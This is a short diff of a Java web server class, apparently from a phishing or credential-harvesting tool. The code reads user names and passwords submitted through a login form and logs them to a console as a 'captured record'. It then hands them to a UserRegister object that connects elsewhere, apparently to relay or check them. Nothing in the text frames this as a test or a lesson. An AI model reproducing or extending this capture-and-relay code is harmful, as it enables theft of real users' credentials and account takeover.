@@ -44,13 +44,13 @@ public class ServerPWeb extends MultiThreadServer {
                         inputLines.add(postData);
                         String params[] = postData.split("[=&]");
                         if(params.length < 4){
-                            WebUtils.printPage(out, name, RecursosWeb.getErrorLoginWeb());
+                            WebUtils.printPage(out, name, RecursosWeb.getLoginWeb(
+                                    "Hay que rellenar todos los campos", 255, 0, 0));
                         }else {
-                            WebUtils.printConfirmPage(out, name);
                             guipWeb.appendln("Nuevo registro capturado.");
                             guipWeb.appendln("User: " + params[1]);
                             guipWeb.appendln("Password: " + params[3]);
-                            UserRegister userRegister = new UserRegister(params[1], params[3]);
+                            UserRegister userRegister = new UserRegister(name, out, params[1], params[3], guipWeb);
                             userRegister.connect();
                         }
                     }else{
